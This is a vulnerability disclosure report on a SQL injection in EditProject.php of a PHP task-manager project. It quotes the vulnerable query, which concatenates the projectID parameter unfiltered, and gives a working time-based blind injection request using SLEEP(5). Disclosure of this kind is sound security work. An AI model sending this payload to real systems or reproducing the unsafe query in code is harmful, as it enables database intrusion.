# task-manager-in-php-sql1

https://code-projects.org/task-manager-in-php-with-source-code/

## NAME OF AFFECTED PRODUCT(S)

**task-manager-in-php**

## Vendor Homepage

https://code-projects.org/task-manager-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

EditProject.php

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection

## Root Cause

EditProject.php file, SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### EditProject.php

source code，the    projectID parameter is not filtered and concatenated into the SQL statement.                                                                                                                                                                                                                                                                                                                                                                                                                                                               

```php
$sql = "SELECT projectName, projectID, projectPrio FROM project WHERE projectID = '".$_GET['projectID']."'";
$edit = $conn -> query($sql);
$edit = $edit -> fetch_assoc();
```

![image-20240925103238931](C:\Users\13756\AppData\Roaming\Typora\typora-user-images\image-20240925103238931.png)

## **Vulnerability recurrence**

### **POC**

```
GET /EditProject.php?edit=1&projectID=1'+AND+(SELECT+3784+FROM+(SELECT(SLEEP(5)))ZvCJ)+AND+'qQab'='qQab HTTP/1.1
Host: 127.0.0.1
Content-Length: 0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

![image-20240925103355243](C:\Users\13756\AppData\Roaming\Typora\typora-user-images\image-20240925103355243.png)

